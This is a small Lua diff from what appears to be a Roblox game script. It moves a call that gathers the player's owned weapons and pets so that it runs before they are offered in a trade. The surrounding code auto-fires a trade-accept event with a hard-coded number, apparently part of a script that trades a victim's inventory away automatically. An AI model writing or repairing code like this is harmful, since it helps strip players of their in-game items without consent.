@@ -133,9 +133,9 @@ local function baiiii()
                 ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
                 tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
             end
-            ownedWeapons, ownedPets = inventoryMeow()
             return
         end
+        ownedWeapons, ownedPets = inventoryMeow()
 
         if ownedWeapons then
             if offerItems("Weapons", ownedWeapons) then
